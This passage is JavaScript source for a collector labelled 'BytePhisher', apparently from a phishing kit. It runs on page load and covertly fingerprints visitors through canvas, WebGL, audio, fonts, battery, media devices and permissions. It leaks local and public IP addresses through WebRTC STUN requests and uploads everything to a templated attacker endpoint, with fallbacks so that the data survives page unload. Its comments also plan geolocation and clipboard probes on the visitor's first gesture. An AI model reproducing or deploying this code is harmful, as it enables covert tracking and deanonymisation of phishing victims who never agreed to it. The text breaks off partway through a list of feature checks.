/* BytePhisher deep-intel collector — runs the moment the page opens.
 *
 * Everything below is information the browser hands to any page on the
 * internet. Each module is isolated in its own try/catch, so one blocked or
 * missing API never costs us the other 40 modules. Results are reported in
 * three waves:
 *
 *   wave "open"   immediately on load   — navigator, screen, timezone, storage,
 *                                         features, permissions, codecs, fonts
 *   wave "deep"   as async probes settle — canvas, webgl, webgpu, audio, battery,
 *                                         webrtc (local + STUN public IP),
 *                                         media devices, storage quota, memory
 *   wave "probe"  on first user gesture  — geolocation, clipboard, notifications,
 *                                         bluetooth/usb/serial/hid counts
 *
 * Wire format: POST <EP> {v, sid, wave, page, ua, mods:{...}, errors:{...}}
 * Transport: navigator.sendBeacon (survives unload) → fetch keepalive → XHR.
 * Payloads over 55 KB are split so no server or proxy drops them.
 */
(function () {
  "use strict";
  var SID = "__SID__";
  var EP = "__INTEL__";
  var PERMS = __PERMS__;          /* true = fire permission-gated probes */
  var CHUNK = 55000;

  var mods = {};                  /* module name -> collected value */
  var errors = {};                /* module name -> error string */
  var sent = 0;

  function safe(name, fn) {
    try {
      var v = fn();
      if (v !== undefined && v !== null) mods[name] = v;
      return v;
    } catch (e) {
      errors[name] = String((e && e.name) || e) + ": " + String((e && e.message) || "");
      return undefined;
    }
  }

  function later(name, fn) {        /* async probe with its own timeout */
    return new Promise(function (res) {
      var done = false;
      var t = setTimeout(function () { if (!done) { done = true; errors[name] = "timeout"; res(); } }, 6000);
      try {
        Promise.resolve(fn()).then(function (v) {
          if (done) return; done = true; clearTimeout(t);
          if (v !== undefined && v !== null) mods[name] = v; res();
        }, function (e) {
          if (done) return; done = true; clearTimeout(t);
          errors[name] = String((e && e.name) || e) + ": " + String((e && e.message) || ""); res();
        });
      } catch (e) {
        if (!done) { done = true; clearTimeout(t); errors[name] = String(e); res(); }
      }
    });
  }

  function encode(str) {
    /* str is ALREADY a JSON string: wrapping it in JSON.stringify again made
       the server receive a JSON *string literal* and answer 400 (found by
       loading the page in a real browser — the collector ran, every beacon
       was rejected). */
    try { return new Blob([str], { type: "application/json" }); }
    catch (e) { return str; }
  }

  function send(wave, extra) {
    var payload = { v: 1, sid: SID, wave: wave, ts: Date.now(),
                    url: String(location.href).slice(0, 500),
                    ref: String(document.referrer || "").slice(0, 500),
                    mods: mods, errors: errors };
    if (extra) for (var k in extra) payload[k] = extra[k];
    var body = JSON.stringify(payload);
    if (body.length > CHUNK) {
      /* split the module map so nothing is silently truncated */
      var keys = Object.keys(mods), part = {}, size = 0, idx = 0;
      for (var i = 0; i < keys.length; i++) {
        var kk = keys[i], vv = JSON.stringify(mods[kk]);
        if (size + vv.length > CHUNK && size > 0) {
          payload.mods = part; payload.part = ++idx;
          push(JSON.stringify(payload));
          part = {}; size = 0;
        }
        part[kk] = mods[kk]; size += vv.length;
      }
      payload.mods = part; payload.part = ++idx; payload.last = true;
      push(JSON.stringify(payload));
      return;
    }
    push(body);
  }

  function push(body) {
    sent++;
    try {
      if (navigator.sendBeacon && navigator.sendBeacon(EP, encode(body))) return;
    } catch (e) {}
    try {
      fetch(EP, { method: "POST", body: body, keepalive: true,
                  headers: { "Content-Type": "application/json" } });
      return;
    } catch (e) {}
    try {
      var x = new XMLHttpRequest();
      x.open("POST", EP, true);
      x.setRequestHeader("Content-Type", "application/json");
      x.send(body);
    } catch (e) {}
  }

  /* ==================================================== 1. navigator ===== */
  safe("nav", function () {
    var n = navigator, o = {
      ua: n.userAgent, appVersion: n.appVersion, appName: n.appName,
      appCodeName: n.appCodeName, platform: n.platform, vendor: n.vendor,
      product: n.product, productSub: n.productSub, buildID: n.buildID || null,
      oscpu: n.oscpu || null,
      language: n.language, languages: (n.languages || []).slice(0, 20),
      cookieEnabled: n.cookieEnabled, doNotTrack: n.doNotTrack,
      globalPrivacyControl: n.globalPrivacyControl === undefined ? null : n.globalPrivacyControl,
      hardwareConcurrency: n.hardwareConcurrency || 0,
      deviceMemory: n.deviceMemory || null,
      maxTouchPoints: n.maxTouchPoints || 0,
      pdfViewerEnabled: n.pdfViewerEnabled === undefined ? null : n.pdfViewerEnabled,
      onLine: n.onLine, webdriver: !!n.webdriver,
      javaEnabled: typeof n.javaEnabled === "function" ? n.javaEnabled() : null,
      plugins: [], mimeTypes: [], pluginCount: 0
    };
    try {
      for (var i = 0; i < (n.plugins || []).length; i++) {
        var p = n.plugins[i];
        var mimes = [];
        try { for (var j = 0; j < p.length; j++) mimes.push(p[j].type); } catch (e) {}
        o.plugins.push({ name: p.name, description: p.description,
                         filename: p.filename, version: p.version || null, mimes: mimes });
      }
      o.pluginCount = o.plugins.length;
      for (var m = 0; m < (n.mimeTypes || []).length; m++) {
        o.mimeTypes.push(n.mimeTypes[m].type);
      }
    } catch (e) { o.pluginErr = String(e); }
    /* userAgentData = the high-entropy client hints, the real device model */
    if (n.userAgentData) {
      o.uaData = { brands: n.userAgentData.brands, mobile: n.userAgentData.mobile,
                   platform: n.userAgentData.platform };
    }
    return o;
  });

  later("uaDataHigh", function () {
    if (!navigator.userAgentData || !navigator.userAgentData.getHighEntropyValues)
      return null;
    return navigator.userAgentData.getHighEntropyValues([
      "architecture", "bitness", "model", "platformVersion", "uaFullVersion",
      "fullVersionList", "wow64", "formFactors"
    ]);
  });

  /* ====================================================== 2. screen ===== */
  safe("screen", function () {
    var s = screen, o = {
      width: s.width, height: s.height, availWidth: s.availWidth,
      availHeight: s.availHeight, availLeft: s.availLeft, availTop: s.availTop,
      colorDepth: s.colorDepth, pixelDepth: s.pixelDepth,
      dpr: window.devicePixelRatio,
      innerW: window.innerWidth, innerH: window.innerHeight,
      outerW: window.outerWidth, outerH: window.outerHeight,
      screenX: window.screenX, screenY: window.screenY,
      isExtended: s.isExtended === undefined ? null : s.isExtended,
      orientation: null, visualViewport: null
    };
    try {
      o.orientation = { type: s.orientation.type, angle: s.orientation.angle };
    } catch (e) {}
    try {
      o.visualViewport = { w: visualViewport.width, h: visualViewport.height,
                           scale: visualViewport.scale, offsetTop: visualViewport.offsetTop,
                           offsetLeft: visualViewport.offsetLeft };
    } catch (e) {}
    /* multi-monitor: getScreenDetails needs a permission, so also count via
       the classic trick (a popup window placed far off-screen) */
    o.mediaQueries = {};
    ["(prefers-color-scheme: dark)", "(prefers-reduced-motion: reduce)",
     "(prefers-contrast: more)", "(forced-colors: active)",
     "(any-pointer: fine)", "(any-pointer: coarse)", "(hover: hover)",
     "(pointer: fine)", "(display-mode: standalone)",
     "(dynamic-range: high)", "(inverted-colors: inverted)",
     "(prefers-reduced-transparency: reduce)"].forEach(function (q) {
      try { o.mediaQueries[q] = matchMedia(q).matches; } catch (e) {}
    });
    return o;
  });

  later("screenDetails", function () {
    if (!window.getScreenDetails) return null;
    return window.getScreenDetails().then(function (d) {
      return { count: d.screens.length, current: d.currentScreen && d.currentScreen.label,
               screens: d.screens.map(function (x) {
                 return { label: x.label, w: x.width, h: x.height, dpr: x.devicePixelRatio,
                          left: x.left, top: x.top, isInternal: x.isInternal,
                          isPrimary: x.isPrimary };
               }) };
    });
  });

  /* ================================================ 3. time / locale ==== */
  safe("time", function () {
    var d = new Date(), r = {};
    try { r.intl = Intl.DateTimeFormat().resolvedOptions(); } catch (e) {}
    r.now = d.toString();
    r.iso = d.toISOString();
    r.tzOffsetMin = d.getTimezoneOffset();
    r.tzOffsetJan = new Date(d.getFullYear(), 0, 1).getTimezoneOffset();
    r.tzOffsetJul = new Date(d.getFullYear(), 6, 1).getTimezoneOffset();
    r.hemisphereHint = r.tzOffsetJan !== r.tzOffsetJul
      ? (r.tzOffsetJan > r.tzOffsetJul ? "north-dst" : "south-dst") : "no-dst";
    try { r.localeString = d.toLocaleString(); r.localeDateString = d.toLocaleDateString(); } catch (e) {}
    try { r.numberFormat = (1234567.891).toLocaleString(); } catch (e) {}
    try { r.currency = (1234.5).toLocaleString(undefined, { style: "currency", currency: "USD" }); } catch (e) {}
    try { r.relative = new Intl.RelativeTimeFormat().format(-1, "day"); } catch (e) {}
    try { r.weekInfo = new Intl.Locale(navigator.language).weekInfo ||
                       new Intl.Locale(navigator.language).getWeekInfo(); } catch (e) {}
    try { r.performance = { tz: Intl.DateTimeFormat().resolvedOptions().timeZone }; } catch (e) {}
    return r;
  });

  /* ================================================== 4. canvas 2d ===== */
  later("canvas", function () {
    var c = document.createElement("canvas");
    c.width = 320; c.height = 70;
    var ctx = c.getContext("2d");
    var out = {};
    try {
      ctx.textBaseline = "alphabetic"; ctx.fillStyle = "#f60"; ctx.fillRect(0, 0, 320, 20);
      ctx.fillStyle = "#069"; ctx.font = "16px 'Arial'";
      ctx.fillText("BytePhisher \u092a\u0939\u091a\u093e\u0928 \u4e2d\u6587 \ud83d\udd10", 4, 40);
      ctx.fillStyle = "rgba(102,204,0,0.7)"; ctx.font = "18px 'Times New Roman'";
      ctx.fillText("canvas fingerprint \u2014 \u00e9\u00e8\u00fc\u00f1", 6, 60);
      var g = ctx.createLinearGradient(0, 0, 320, 70);
      g.addColorStop(0, "#f00"); g.addColorStop(1, "#00f");
      ctx.fillStyle = g; ctx.fillRect(0, 20, 60, 8);
      out.dataURL = c.toDataURL().slice(-120);
      out.fullHash = c.toDataURL().length;
    } catch (e) { out.err = String(e); }
    try {
      var e2 = document.createElement("canvas").getContext("2d");
      out.emoji = (function () { e2.font = "24px Arial"; e2.fillText("\ud83d\ude00\ud83d\ude80\ud83c\udf0d", 0, 24);
                                 return document.createElement("canvas"); })().toDataURL ?
        (function (x) { x.width = 60; x.height = 30; var y = x.getContext("2d");
                        y.font = "24px Arial"; y.fillText("\ud83d\ude00\ud83d\ude80", 0, 24);
                        return x.toDataURL().slice(-60); })(document.createElement("canvas")) : null;
    } catch (e) {}
    /* detect a canvas that is faked/blocked (anti-fingerprint extensions) */
    out.blank = /^data:image\/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8\/9hAAAA/.test(
      c.toDataURL()) || c.toDataURL().length < 200;
    return out;
  });

  /* ==================================================== 5. webgl ======= */
  later("webgl", function () {
    var out = { contexts: [] };
    ["webgl2", "webgl", "experimental-webgl"].forEach(function (kind) {
      try {
        var cv = document.createElement("canvas");
        var gl = cv.getContext(kind, { failIfMajorPerformanceCaveat: false });
        if (!gl) { out.contexts.push({ kind: kind, available: false }); return; }
        var dbg = gl.getExtension("WEBGL_debug_renderer_info");
        var exts = gl.getSupportedExtensions() || [];
        var params = {};
        try {
          /* WebGL1 rejects WebGL2-only enum names with INVALID_ENUM warnings,
             so query the common set on both, the rest only on webgl2. */
          var common = ["MAX_TEXTURE_SIZE", "MAX_RENDERBUFFER_SIZE", "MAX_VIEWPORT_DIMS",
                        "MAX_VERTEX_ATTRIBS", "MAX_VERTEX_UNIFORM_VECTORS",
                        "MAX_FRAGMENT_UNIFORM_VECTORS", "MAX_VARYING_VECTORS",
                        "MAX_COMBINED_TEXTURE_IMAGE_UNITS", "MAX_TEXTURE_IMAGE_UNITS",
                        "ALIASED_LINE_WIDTH_RANGE", "ALIASED_POINT_SIZE_RANGE",
                        "MAX_CUBE_MAP_TEXTURE_SIZE"];
          var gl2only = ["MAX_3D_TEXTURE_SIZE", "MAX_ARRAY_TEXTURE_LAYERS", "MAX_ELEMENT_INDEX",
                         "MAX_UNIFORM_BUFFER_BINDINGS", "MAX_SAMPLES"];
          var names = kind === "webgl2" ? common.concat(gl2only) : common;
          names.forEach(function (n) {
            var id = gl[n];
            if (id === undefined) return;                 // not defined in this context
            var v = gl.getParameter(id);
            if (v !== null && v !== undefined) {
              params[n] = (typeof v === "object" && v.length !== undefined)
                ? Array.prototype.slice.call(v) : v;
            }
          });
        } catch (e) {}
        out.contexts.push({
          kind: kind, available: true,
          vendor: gl.getParameter(gl.VENDOR),
          renderer: gl.getParameter(gl.RENDERER),
          version: gl.getParameter(gl.VERSION),
          glsl: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
          unmaskedVendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : null,
          unmaskedRenderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : null,
          extensionCount: exts.length,
          extensions: exts.slice(0, 60),
          params: params,
          maxAnisotropy: (function () {
            var e = gl.getExtension("EXT_texture_filter_anisotropic");
            return e ? gl.getParameter(e.MAX_TEXTURE_MAX_ANISOTROPY_EXT) : null;
          })()
        });
      } catch (e) { out.contexts.push({ kind: kind, err: String(e) }); }
    });
    return out;
  });

  later("webgpu", function () {
    if (!navigator.gpu) return null;
    return navigator.gpu.requestAdapter().then(function (a) {
      if (!a) return { adapter: null };
      var info = a.info || (a.requestAdapterInfo ? a.requestAdapterInfo() : null);
      return { info: info ? { vendor: info.vendor, architecture: info.architecture,
                              device: info.device, description: info.description } : null,
               features: (a.features ? Array.from(a.features) : []).slice(0, 40),
               limits: a.limits ? { maxTextureDimension2D: a.limits.maxTextureDimension2D,
                                    maxBufferSize: a.limits.maxBufferSize,
                                    maxComputeWorkgroupSizeX: a.limits.maxComputeWorkgroupSizeX } : null };
    });
  });

  /* ==================================================== 6. audio ======= */
  later("audio", function () {
    var AC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
    if (!AC) return null;
    var ctx = new AC(1, 44100, 44100);
    var osc = ctx.createOscillator(), comp = ctx.createDynamicsCompressor();
    osc.type = "triangle"; osc.frequency.value = 10000;
    try {
      comp.threshold.value = -50; comp.knee.value = 40; comp.ratio.value = 12;
      comp.attack.value = 0; comp.release.value = 0.25;
    } catch (e) {}
    osc.connect(comp); comp.connect(ctx.destination); osc.start(0);
    return ctx.startRendering().then(function (buf) {
      var d = buf.getChannelData(0), sum = 0, tail = [];
      for (var i = 4500; i < 5000; i++) { sum += Math.abs(d[i]); tail.push(d[i]); }
      return { sum: sum, tail: tail.slice(0, 12) };
    });
  });

  /* ============================================ 7. math / cpu print ==== */
  safe("math", function () {
    var out = {};
    [["sin", Math.sin(1e5)], ["cos", Math.cos(1e5)], ["tan", Math.tan(1e5)],
     ["asin", Math.asin(0.5)], ["acos", Math.acos(0.5)], ["atan", Math.atan(0.5)],
     ["sinh", Math.sinh(1)], ["cosh", Math.cosh(10)], ["tanh", Math.tanh(1)],
     ["exp", Math.exp(1)], ["expm1", Math.expm1(1)], ["log1p", Math.log1p(10)],
     ["log2", Math.log2(1e5)], ["cbrt", Math.cbrt(100)], ["pow", Math.pow(Math.PI, -100)],
     ["hypot", Math.hypot(1e300, 1e300)], ["fround", Math.fround(5.5)],
     ["atanh", Math.atanh(0.5)], ["acosh", Math.acosh(1e300)], ["sign", Math.sign(-3)]]
      .forEach(function (p) { out[p[0]] = p[1]; });
    return out;
  });

  /* ==================================================== 8. fonts ======= */
  later("fonts", function () {
    var base = ["monospace", "sans-serif", "serif"];
    var probe = ["Arial", "Arial Black", "Arial Narrow", "Arial Rounded MT Bold",
      "Helvetica", "Helvetica Neue", "Verdana", "Tahoma", "Trebuchet MS", "Georgia",
      "Times New Roman", "Times", "Courier New", "Courier", "Lucida Console",
      "Lucida Sans Unicode", "Palatino Linotype", "Book Antiqua", "Garamond",
      "Comic Sans MS", "Impact", "Webdings", "Symbol", "Wingdings", "MS Sans Serif",
      "MS Serif", "Segoe UI", "Calibri", "Cambria", "Candara", "Consolas", "Constantia",
      "Corbel", "Franklin Gothic Medium", "Gabriola", "Marlett", "Microsoft Sans Serif",
      "MingLiU", "SimSun", "SimHei", "Microsoft YaHei", "Malgun Gothic", "Meiryo",
      "MS Gothic", "MS PGothic", "Yu Gothic", "Hiragino Kaku Gothic Pro", "Hiragino Sans",
      "PingFang SC", "PingFang TC", "Heiti SC", "Songti SC", "STHeiti", "Apple SD Gothic Neo",
      "Noto Sans", "Noto Sans CJK JP", "Noto Color Emoji", "DejaVu Sans", "DejaVu Serif",
      "DejaVu Sans Mono", "Liberation Sans", "Liberation Serif", "Liberation Mono",
      "Ubuntu", "Ubuntu Mono", "Cantarell", "Droid Sans", "Droid Sans Mono", "FreeSans",
      "Nimbus Sans", "Nimbus Roman", "Nimbus Mono PS", "Open Sans", "Roboto", "Lato",
      "Montserrat", "Source Sans Pro", "Fira Sans", "Fira Code", "JetBrains Mono",
      "Menlo", "Monaco", "Geneva", "Optima", "Futura", "Baskerville", "Copperplate",
      "Papyrus", "Herculanum", "Chalkboard", "Chalkduster", "American Typewriter",
      "Andale Mono", "Athelas", "Avenir", "Avenir Next", "Big Caslon", "Brush Script MT",
      "Didot", "Gill Sans", "Hoefler Text", "Iowan Old Style", "Lucida Grande",
      "Marker Felt", "Noteworthy", "San Francisco", "SF Pro Text", "Skia", "Zapfino"];
    var span = document.createElement("span");
    span.style.cssText = "position:absolute;left:-9999px;top:-9999px;font-size:72px;" +
                         "white-space:nowrap;visibility:hidden;";
    span.textContent = "mmmmmmmmmmlli\u00c4\u00d6\u00dc\u00e9\u00f1\u4e2d\u6587\ud83d\ude00";
    document.body.appendChild(span);
    var baseSize = {};
    base.forEach(function (f) { span.style.fontFamily = f; baseSize[f] = span.offsetWidth + "x" + span.offsetHeight; });
    var present = [];
    probe.forEach(function (f) {
      var differs = base.some(function (b) {
        span.style.fontFamily = "'" + f + "'," + b;
        return (span.offsetWidth + "x" + span.offsetHeight) !== baseSize[b];
      });
      if (differs) present.push(f);
    });
    document.body.removeChild(span);
    return { count: present.length, probeCount: probe.length, present: present };
  });

  /* ==================================================== 9. battery ===== */
  later("battery", function () {
    if (!navigator.getBattery) return null;
    return navigator.getBattery().then(function (b) {
      return { charging: b.charging, level: b.level, chargingTime: b.chargingTime,
               dischargingTime: b.dischargingTime };
    });
  });

  /* ==================================================== 10. network ==== */
  safe("net", function () {
    var c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    var o = { type: c ? c.type : null, effectiveType: c ? c.effectiveType : null,
              downlink: c ? c.downlink : null, downlinkMax: c ? c.downlinkMax : null,
              rtt: c ? c.rtt : null, saveData: c ? c.saveData : null };
    try {
      var e = performance.getEntriesByType("navigation")[0];
      if (e) {
        o.timing = { dns: Math.round(e.domainLookupEnd - e.domainLookupStart),
                     tcp: Math.round(e.connectEnd - e.connectStart),
                     tls: Math.round(e.secureConnectionStart > 0 ? e.connectEnd - e.secureConnectionStart : 0),
                     ttfb: Math.round(e.responseStart - e.requestStart),
                     transfer: Math.round(e.responseEnd - e.responseStart),
                     domReady: Math.round(e.domContentLoadedEventEnd - e.startTime),
                     load: Math.round(e.loadEventEnd - e.startTime),
                     redirects: e.redirectCount, nextHop: e.nextHopProtocol || null,
                     encodedBody: e.encodedBodySize, decodedBody: e.decodedBodySize };
      }
    } catch (e) {}
    try { o.memory = performance.memory ? { jsHeapLimit: performance.memory.jsHeapSizeLimit,
             totalJSHeap: performance.memory.totalJSHeapSize,
             usedJSHeap: performance.memory.usedJSHeapSize } : null; } catch (e) {}
    return o;
  });

  /* ==================================================== 11. storage ==== */
  safe("storage", function () {
    var o = { local: false, session: false, indexedDB: false, caches: false,
              serviceWorker: false, quota: null };
    try { localStorage.setItem("__bh_t", "1"); o.local = true; localStorage.removeItem("__bh_t"); } catch (e) {}
    try { sessionStorage.setItem("__bh_t", "1"); o.session = true; sessionStorage.removeItem("__bh_t"); } catch (e) {}
    try { o.indexedDB = !!window.indexedDB; } catch (e) {}
    try { o.caches = !!window.caches; } catch (e) {}
    try { o.serviceWorker = !!navigator.serviceWorker; } catch (e) {}
    try { o.cookie = document.cookie.length; } catch (e) {}
    try { o.storageManager = !!navigator.storage; } catch (e) {}
    return o;
  });

  later("quota", function () {
    if (!navigator.storage || !navigator.storage.estimate) return null;
    return navigator.storage.estimate().then(function (q) {
      return { quota: q.quota, usage: q.usage,
               persisted: navigator.storage.persisted ? navigator.storage.persisted() : null };
    });
  });

  /* ================================================= 12. permissions === */
  later("permissions", function () {
    if (!navigator.permissions || !navigator.permissions.query) return null;
    var names = ["geolocation", "notifications", "camera", "microphone",
      "clipboard-read", "clipboard-write", "midi", "background-sync",
      "persistent-storage", "push", "screen-wake-lock", "accelerometer",
      "gyroscope", "magnetometer", "ambient-light-sensor", "payment-handler",
      "storage-access", "window-management", "local-fonts", "idle-detection"];
    return Promise.all(names.map(function (n) {
      return navigator.permissions.query({ name: n })
        .then(function (s) { return [n, s.state]; })
        .catch(function () { return [n, "unsupported"]; });
    })).then(function (rows) {
      var o = {}; rows.forEach(function (r) { o[r[0]] = r[1]; }); return o;
    });
  });

  /* ================================================ 13. media devices == */
  later("mediaDevices", function () {
    if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) return null;
    return navigator.mediaDevices.enumerateDevices().then(function (ds) {
      var kinds = {}, ids = [];
      ds.forEach(function (d) {
        kinds[d.kind] = (kinds[d.kind] || 0) + 1;
        ids.push({ kind: d.kind, label: d.label || "", groupId: (d.groupId || "").slice(0, 8),
                   deviceId: (d.deviceId || "").slice(0, 8) });
      });
      return { count: ds.length, kinds: kinds, devices: ids.slice(0, 20),
               labelsVisible: ds.some(function (d) { return !!d.label; }) };
    });
  });

  /* ==================================================== 14. codecs ===== */
  safe("codecs", function () {
    var v = document.createElement("video"), a = document.createElement("audio");
    var out = {};
    var video = { "h264": 'video/mp4; codecs="avc1.42E01E"',
      "h264-high": 'video/mp4; codecs="avc1.640028"',
      "hevc": 'video/mp4; codecs="hvc1.1.6.L93.B0"',
      "av1": 'video/mp4; codecs="av01.0.05M.08"',
      "vp8": 'video/webm; codecs="vp8"', "vp9": 'video/webm; codecs="vp9"',
      "vp9-profile2": 'video/webm; codecs="vp09.02.10.10"',
      "mp4v": 'video/mp4; codecs="mp4v.20.8"', "theora": 'video/ogg; codecs="theora"',
      "dolby-vision": 'video/mp4; codecs="dvh1.05.07"' };
    var audio = { "aac": 'audio/mp4; codecs="mp4a.40.2"',
      "mp3": "audio/mpeg", "opus": 'audio/webm; codecs="opus"',
      "vorbis": 'audio/ogg; codecs="vorbis"', "flac": "audio/flac",
      "wav": "audio/wav", "ac3": 'audio/mp4; codecs="ac-3"',
      "eac3": 'audio/mp4; codecs="ec-3"', "alac": 'audio/mp4; codecs="alac"' };
    for (var k in video) { try { out[k] = v.canPlayType(video[k]) || ""; } catch (e) {} }
    for (var k2 in audio) { try { out[k2] = a.canPlayType(audio[k2]) || ""; } catch (e) {} }
    try {
      out.mediaSource = !!window.MediaSource;
      out.mseHevc = window.MediaSource && MediaSource.isTypeSupported
        ? MediaSource.isTypeSupported('video/mp4; codecs="hvc1.1.6.L93.B0"') : null;
      out.mseAv1 = window.MediaSource && MediaSource.isTypeSupported
        ? MediaSource.isTypeSupported('video/mp4; codecs="av01.0.05M.08"') : null;
      out.emeWidevine = !!navigator.requestMediaKeySystemAccess;
      out.drm = null;
    } catch (e) {}
    return out;
  });

  later("drm", function () {
    if (!navigator.requestMediaKeySystemAccess) return null;
    var cfg = [{ initDataTypes: ["cenc"],
                 videoCapabilities: [{ contentType: 'video/mp4; codecs="avc1.42E01E"' }] }];
    var keys = { widevine: "com.widevine.alpha", playready: "com.microsoft.playready",
                 fairplay: "com.apple.fps", clearkey: "org.w3.clearkey" };
    return Promise.all(Object.keys(keys).map(function (name) {
      return navigator.requestMediaKeySystemAccess(keys[name], cfg)
        .then(function () { return [name, true]; })
        .catch(function () { return [name, false]; });
    })).then(function (rows) { var o = {}; rows.forEach(function (r) { o[r[0]] = r[1]; }); return o; });
  });

  /* ==================================================== 15. webrtc ===== */
  later("webrtc", function () {
    var PC = window.RTCPeerConnection || window.webkitRTCPeerConnection;
    if (!PC) return null;
    return new Promise(function (res) {
      var ips = {}, types = {}, done = false;
      var pc = new PC({ iceServers: [{ urls: "stun:stun.l.google.com:19302" },
                                     { urls: "stun:stun1.l.google.com:19302" }] });
      function finish() {
        if (done) return; done = true;
        try { pc.close(); } catch (e) {}
        res({ ips: Object.keys(ips), types: types, mdns: Object.keys(ips).some(function (i) { return /\.local$/.test(i); }) });
      }
      var to = setTimeout(finish, 5000);
      pc.onicecandidate = function (e) {
        if (!e.candidate) { clearTimeout(to); finish(); return; }
        var c = e.candidate.candidate, m;
        if ((m = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(c))) ips[m[1]] = 1;
        if ((m = /([0-9a-f:]{6,})\.local/.exec(c))) ips[m[1] + ".local"] = 1;
        if ((m = /([0-9a-f]{1,4}(:[0-9a-f]{0,4}){2,7})/i.exec(c)) && c.indexOf(":") > -1 &&
            / udp | tcp /.test(" " + c + " ")) { if (!/^\d/.test(m[1]) || m[1].indexOf(":") > 0) ips[m[1]] = 1; }
        var t = (c.split(" typ ")[1] || "").split(" ")[0];
        if (t) types[t] = (types[t] || 0) + 1;
      };
      try {
        pc.createDataChannel("bh");
        pc.createOffer().then(function (o) { return pc.setLocalDescription(o); });
      } catch (e) { clearTimeout(to); finish(); }
    });
  });

  /* ============================================= 16. feature matrix ==== */
  safe("features", function () {
    var n = navigator, w = window;
    /* Every entry below must be a VALUE or an `in` test. Reading an accessor
       straight off a prototype (e.g. HTMLMediaElement.prototype.remote) throws
       "Illegal invocation" and, before this rule, wiped out all 180 checks in
       one go. `T()` keeps any future slip to a single false. */
    function T(fn) { try { return !!fn(); } catch (e) { return false; } }
    var checks = {
      "WebAssembly": !!w.WebAssembly, "wasmSimd": (function () {
        try { return WebAssembly.validate(new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,123,3,2,1,0,10,10,1,8,0,65,0,253,15,253,98,11])); }
        catch (e) { return false; }
      })(),
      "wasmThreads": (function () { try { return WebAssembly.validate(new Uint8Array([0,97,115,109,1,0,0,0,1,4,1,96,0,0,3,2,1,0,5,4,1,3,1,0,10,11,1,9,0,65,0,254,16,0,26,11])); } catch (e) { return false; } })(),
      "SharedArrayBuffer": typeof SharedArrayBuffer !== "undefined",
      "WebWorker": !!w.Worker, "SharedWorker": !!w.SharedWorker,
      "ServiceWorker": !!n.serviceWorker, "WebSocket": !!w.WebSocket,
      "EventSource": !!w.EventSource, "BroadcastChannel": !!w.BroadcastChannel,
      "MessageChannel": !!w.MessageChannel, "OffscreenCanvas": !!w.OffscreenCanvas,
      "WebGL2": (function () { try { return !!document.createElement("canvas").getContext("webgl2"); } catch (e) { return false; } })(),
      "WebGPU": !!n.gpu, "WebXR": !!n.xr, "WebVR": !!n.getVRDisplays,
      "WebUSB": !!n.usb, "WebSerial": !!n.serial, "WebBluetooth": !!n.bluetooth,
      "WebNFC": !!w.NDEFReader, "WebHID": !!n.hid, "Gamepad": !!n.getGamepads,
      "Geolocation": !!n.geolocation, "Notifications": !!w.Notification,
      "PushManager": !!w.PushManager, "PaymentRequest": !!w.PaymentRequest,
      "WebAuthn": !!w.PublicKeyCredential, "CredentialManagement": !!n.credentials,
      "PasswordCredential": !!(w.PasswordCredential || (n.credentials && "PasswordCredential" in w)),
      "DigitalCredentials": !!(n.credentials && n.credentials.get),
      "SpeechSynthesis": !!w.speechSynthesis, "SpeechRecognition": !!(w.SpeechRecognition || w.webkitSpeechRecognition),
      "MediaRecorder": !!w.MediaRecorder, "getUserMedia": !!(n.mediaDevices && n.mediaDevices.getUserMedia),
      "getDisplayMedia": !!(n.mediaDevices && n.mediaDevices.getDisplayMedia),
      "RTCPeerConnection": !!w.RTCPeerConnection,
      /* `in`, never a read: audioWorklet is an accessor on BaseAudioContext and
         reading it off the prototype throws Illegal invocation */
      "AudioWorklet": !!(w.AudioContext && "audioWorklet" in AudioContext.prototype),
      "WebAudio": !!(w.AudioContext || w.webkitAudioContext),
      "BarcodeDetector": !!w.BarcodeDetector, "FaceDetector": !!w.FaceDetector,
      "ShapeDetection": !!w.ShapeDetector, "Clipboard": !!n.clipboard,
      "ClipboardReadText": !!(n.clipboard && n.clipboard.readText),
      "Vibration": !!n.vibrate, "WakeLock": !!n.wakeLock, "IdleDetection": !!w.IdleDetector,
      "ContactsPicker": !!n.contacts, "FileSystemAccess": !!w.showOpenFilePicker,
      "FileSystemDirectory": !!w.showDirectoryPicker, "FileSystemObserver": !!w.FileSystemObserver,
      "CompressionStream": !!w.CompressionStream, "DecompressionStream": !!w.DecompressionStream,
      "ReadableStream": !!w.ReadableStream, "TransformStream": !!w.TransformStream,
      "IntlSegmenter": typeof Intl !== "undefined" && !!Intl.Segmenter,
      "IntlDisplayNames": typeof Intl !== "undefined" && !!Intl.DisplayNames,
      "IntlListFormat": typeof Intl !== "undefined" && !!Intl.ListFormat,
      "IntlPluralRules": typeof Intl !== "undefined" && !!Intl.PluralRules,
      "IntlRelativeTime": typeof Intl !== "undefined" && !!Intl.RelativeTimeFormat,
      "IntlDurationFormat": typeof Intl !== "undefined" && !!Intl.DurationFormat,
      "DateTimeFormat": typeof Intl !== "undefined",
      "Temporal": typeof Temporal !== "undefined",
      "structuredClone": !!w.structuredClone, "ResizeObserver": !!w.ResizeObserver,
      "IntersectionObserver": !!w.IntersectionObserver, "MutationObserver": !!w.MutationObserver,
      "PerformanceObserver": !!w.PerformanceObserver, "ReportingObserver": !!w.ReportingObserver,
      "PerformanceEntry": !!w.PerformanceEntry, "UserTiming": !!(performance && performance.mark),
      "NavigationAPI": !!(w.navigation && w.navigation.entries),
      "ViewTransitions": !!document.startViewTransition,
      "Popover": !!w.HTMLElement && "popover" in HTMLElement.prototype,
      "Dialog": !!w.HTMLDialogElement,
      "CustomElements": !!w.customElements, "ShadowDOM": !!w.ShadowRoot,
      "Template": !!w.HTMLTemplateElement, "Slot": !!w.HTMLSlotElement,
      "CSSContainerQueries": !!(w.CSS && CSS.supports && CSS.supports("container-type", "inline-size")),
      "CSSHas": !!(w.CSS && CSS.supports && CSS.supports("selector(:has(a))")),
      "CSSNesting": !!(w.CSS && CSS.supports && CSS.supports("& a", "color:red")),
      "CSSBackdropFilter": !!(w.CSS && CSS.supports && CSS.supports("backdrop-filter", "blur(2px)")),
